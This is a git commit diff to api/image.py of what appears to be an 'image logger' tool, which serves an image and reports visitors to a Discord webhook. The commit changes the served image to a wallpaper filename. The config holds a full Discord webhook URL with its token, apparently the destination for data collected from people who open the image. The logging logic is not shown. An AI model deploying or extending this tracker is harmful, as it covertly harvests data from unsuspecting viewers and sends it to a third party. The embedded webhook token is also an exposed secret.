c9b01653f5424a2e5393e6b9bb2658eba0dd1fd5
zlata780 <ggongas078@gmail.com>
2025-07-02 17:39:31 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1390008732905115760/m0kTU2nSJGJcrWPhFPfNWmciCx9Qtw0QBT6fyCFU60hKCb1ndkOQ1h8-DK_N8ynlwQ6H",
-    "image": "https://tenor-steel-ten.vercel.app/api/image", # You can also have a custom image by using a URL argument
+    "image": "1686292349_windows_xp_bliss_wallpaper_4k.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
